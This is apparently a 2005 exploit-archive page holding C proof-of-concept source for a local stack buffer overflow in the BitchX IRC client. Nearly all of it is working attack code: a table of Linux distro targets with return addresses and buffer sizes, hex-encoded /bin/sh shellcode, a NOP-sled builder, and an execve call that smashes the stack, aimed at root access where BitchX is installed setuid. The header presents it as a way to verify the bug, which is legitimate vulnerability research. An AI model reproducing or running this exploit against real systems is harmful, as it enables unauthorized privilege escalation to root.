<html><head><title>BitchX <= 1.0c20 Local Buffer Overflow Exploit</title></head><pre>/* Tested on BitchX-1.0c19 /str0ke */
/*
 * P.o.C Exploit Code for BitchX
 * made for Version (BitchX-1.0c20cvs) -- Date (20020325)
 *
 * (C) 2004. GroundZero Security Research and Software Development
 *           http://www.groundzero-security.com 
 *
 * released under the GNU GPL - http://www.gnu.org/licenses/gpl.txt
 *
 * --[ background
 *
 * BitchX contains an local exploitable Buffer Overflow condition.
 * Sometimes it is installed setUID to allow non-root users SSL
 * access for example and therfore it could be used by a mallicious
 * local user, to obtain root access. This code demonstrates the
 * described vulnerability and can be used to verify the bug on
 * your system(s).
 */

#include &lt;stdio.h&gt;

struct {
  char *distro;
  char *version;
  char *bx;
  unsigned int return_add;
  unsigned int buff_size;
} T[] = {
            { &quot;SuSE Linux&quot;,   &quot;8.2&quot;, &quot;BitchX-1.0c20cvs&quot;, 0xbfffff88, 2111 },
            { &quot;Debian Linux&quot;, &quot;3.0&quot;, &quot;BitchX-1.0c19&quot;,    0xbfffff5c, 2090 },
            { &quot;END&quot;,          &quot;&quot;,    &quot;&quot;,                 0,          0    },
        }; 

char shellcode[]=&quot;\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b&quot;
                 &quot;\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd&quot;
                 &quot;\x80\xe8\xdc\xff\xff\xff/bin/sh&quot;;

int usage(char *argv)
{
    int i;

    fprintf (stdout, &quot;\nUsage: %s &lt;path+bin&gt;\n&quot;,argv);
    fprintf (stdout, &quot; i.e.: %s /bin/BitchX\n\n&quot;,argv);
    fprintf (stdout, &quot;Available Targets:\n&quot;);
    for(i=0;T[i].distro!=&quot;END&quot;;i++)
    fprintf (stdout, &quot;\t\t\t %i: (%s %s) %s\n&quot;,i,T[i].distro,T[i].version,T[i].bx);

    return(0);
}
     
int main(int argc, char *argv[])
{
    unsigned int i;
    unsigned int t;

    char buffer[3000];
    char *a1     = &quot;sh&quot;;
    char *a2     = &quot;-c&quot;;
    char *env[]  = { &quot;TERM=xterm&quot;, 0 };    
    char *args[] = { a1, a2, buffer, 0};  /* arguments list */

    fprintf (stdout, &quot;\n\n#############################################################\n&quot;);
    fprintf (stdout, &quot;### GroundZero Security Research and Software Development ###\n&quot;);
    fprintf (stdout, &quot;### Linux Local P.o.C Exploit for BitchX                  ###\n&quot;);
    fprintf (stdout, &quot;#############################################################\n\n&quot;);
 
    if(argv[1]==NULL||argv[2]==NULL)
    {
        usage (argv[0]);
        fprintf (stdout, &quot;\n&quot;);
        exit (0);
    }

    if(strlen(argv[1])&gt;255||strlen(argv[2])&gt;255)
    {
        exit (-1); 
    }

    t=atoi(argv[2]); 

    fprintf (stdout, &quot;selected: %s %s %s\n&quot;,T[t].distro,T[t].version,T[t].bx); 
    fprintf (stdout, &quot;using return address: 0x%lx\n&quot;,T[t].return_add);

    for ( i=0; i&lt;T[t].buff_size; i+=4) *(long *)&amp;buffer[i]=T[t].return_add;  /* put return address in buffer */
    for ( i=0; i&lt;(T[t].buff_size-strlen(shellcode)-40); ++i) *(buffer+i)=0x90; /* add nop's */

    memcpy (buffer+i,shellcode,strlen(shellcode));  /* generate exploit string */

    fprintf (stdout, &quot;Launching Exploit against %s, you got 3 seconds to abort.. (ctrl+c)\n&quot;,argv[1]);
    sleep(3);

    if((execve (argv[1],args,env))==-1)  /* execute binary and smash the stack */
    {
        perror(&quot;execve&quot;);
        exit (-1);
    }

    exit (0);
}

// milw0rm.com [2005-04-21]</pre></html>